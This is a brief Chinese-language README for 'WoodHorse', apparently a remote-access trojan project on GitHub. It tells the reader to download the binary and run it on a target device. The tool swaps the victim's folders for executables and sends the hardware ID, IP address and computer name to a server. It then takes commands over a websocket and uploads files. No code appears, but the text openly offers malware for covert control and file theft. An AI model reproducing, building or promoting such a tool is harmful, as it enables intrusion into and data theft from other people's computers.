# WoodHorse
Simplely wood horse

### How it works

 1. 你先到那个 [release](https://github.com/algxdm/WoodHorse/releases) 把本体下载咯
 2. 然后到目标设备上运行本体
 3. 然后你就会发现哎所有文件夹都被替换成exe了
 4. 同时本程序也会在第一时间向服务器发送注册消息，提交硬件码和IP地址和计算机名称(用于识别)
 5. 根据这两者服务器返回消息 token 和目标地址 (websocket 地址以收发指令, url 地址以提交文件)
 6. 根据获取到的消息 token, 向 socket 地址发送握手消息并建立连接
